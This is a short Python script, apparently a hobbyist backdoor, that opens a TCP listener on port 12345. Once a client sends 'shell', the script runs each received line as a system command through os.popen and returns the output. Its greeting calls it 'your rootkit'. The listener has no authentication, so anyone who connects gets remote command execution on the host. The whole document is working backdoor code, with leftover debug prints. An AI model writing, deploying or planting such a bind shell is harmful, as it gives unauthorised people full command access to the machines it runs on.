#! /usr/bin/python
# -*- coding: UTF-8 -*-
import socket
import os
def main():
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    host = socket.gethostname()
    port = 12345
    #The port you want
    s.bind((host,port))
    s.listen(5)
    while True:
        c,addr = s.accept()
        while True:
            try:
                command = c.recv(1024).decode("utf-8")
                if command == "shell":
                    c.send("I glad to be your rootkit,you can input exit to quitbbb".encode("utf-8"))
                    while True:
                        command = c.recv(1024).decode("utf-8")
                        if command == "exit":
                            c.send("okbbb".encode("utf-8"))
                            break
                        else:
                            try:
                                print("poin1")
                                dumps = os.popen(command).read()
                                print("point2")
                            except Exception as e1:
                                dumps = "错喽！"
                            c.send((dumps+"bbb").encode("utf-8"))
                            print("point3")
#                        print("point4")

                    print("point7")
                else:
                    c.send((command+"bbb").encode("utf-8"))
                print("point5")
            except Exception as e:
                print(e)
                break
            print("point6")
        c.close()
    s.close()
if __name__ == "__main__":
    main()